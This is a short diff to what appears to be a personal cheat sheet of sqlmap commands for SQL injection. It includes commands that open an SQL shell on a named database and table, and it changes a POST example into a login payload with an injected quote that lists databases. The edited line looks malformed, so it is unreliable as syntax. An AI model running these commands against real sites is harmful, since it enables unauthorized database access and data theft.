@@ -29,4 +29,4 @@ entering into sqlshell
  python sqlmap.py -u 'http://www.example.com/events.php?EventID=6121' --sql-shell -D bwebmain_central -T Surveys
 
 #injecting sites with POST parameters
-python sqlmap.py -u "www.example.com" --data"contents" -p "username"  --dbs
+python sqlmap.py -u "www.example.com" --data"=username=test%27&password=test&submit=Login" -p "username"  --dbs
